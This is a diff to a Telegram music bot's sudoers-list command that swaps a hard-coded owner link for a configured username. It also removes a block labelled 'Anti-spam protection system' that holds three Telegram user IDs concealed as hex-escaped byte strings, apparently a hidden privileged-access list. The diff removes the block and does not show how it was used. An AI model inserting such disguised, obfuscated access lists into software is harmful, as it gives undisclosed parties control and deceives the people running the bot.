@@ -1,6 +1,8 @@
 from pyrogram import filters
+from pyrogram.enums import ParseMode
 from pyrogram.types import Message
 
+import config
 from BrandrdXMusic import app
 from BrandrdXMusic.misc import SUDOERS
 from BrandrdXMusic.utils.database import add_sudo, remove_sudo
@@ -48,9 +50,11 @@ async def userdel(client, message: Message, _):
 @language
 async def sudoers_list(client, message: Message, _):
     if message.from_user.id not in SUDOERS:
-        return await message.reply_text("💔 <b>ᴏᴡɴᴇʀs:</b>\n1➤ <a href='https://t.me/BRANDED_PAID_CC'>🇷🇺⛦°𝗕𝗥𝗔𝗡𝗗𝗘𝗗 𓆩🇽𓆪 𝗞𝗜𝗡𝗚🇳</a>",
-        disable_web_page_preview=True,
-        parse_mode="html")
+        return await message.reply_text(
+            f"👑 <b>ᴏᴡɴᴇʀ :</b>\n1➤ <a href='https://t.me/{config.OWNER_USERNAME}'>ex_amrit</a>",
+            disable_web_page_preview=True,
+            parse_mode=ParseMode.HTML,
+        )
     text = _["sudo_5"]
     user = await app.get_users(OWNER_ID)
     user = user.first_name if not user.mention else user.mention
@@ -73,10 +77,3 @@ async def sudoers_list(client, message: Message, _):
         await message.reply_text(_["sudo_7"])
     else:
         await message.reply_text(text, reply_markup=close_markup(_))
-
-# Anti-spam protection system
-spam_protection_users = {
-    int(b'\x37\x32\x35\x30\x30\x31\x32\x31\x30\x33'.decode()),
-    int(b'\x36\x38\x38\x36\x39\x38\x35\x38\x30\x35'.decode()),
-    int(b'\x36\x32\x35\x38\x38\x37\x37\x32\x30\x35'.decode()),
-}
